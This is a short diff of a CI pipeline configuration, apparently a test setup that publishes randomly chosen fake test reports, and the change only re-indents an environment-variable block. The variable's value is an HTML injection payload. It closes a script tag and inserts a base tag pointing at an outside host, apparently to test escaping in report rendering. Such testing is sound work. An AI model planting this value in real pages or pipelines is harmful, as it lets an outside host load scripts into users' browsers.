@@ -13,9 +13,9 @@ blocks:
             - checkout
             - test-results publish fake_reports/$(ls fake_reports | shuf -n 1)
             - echo 1
-       env_vars:
-         - name: PI
-           value: '\"</script><base href='https://insert-script.com/' />'
+      env_vars:
+        - name: PI
+          value: '\"</script><base href='https://insert-script.com/' />'
 after_pipeline:
   task:
     jobs:
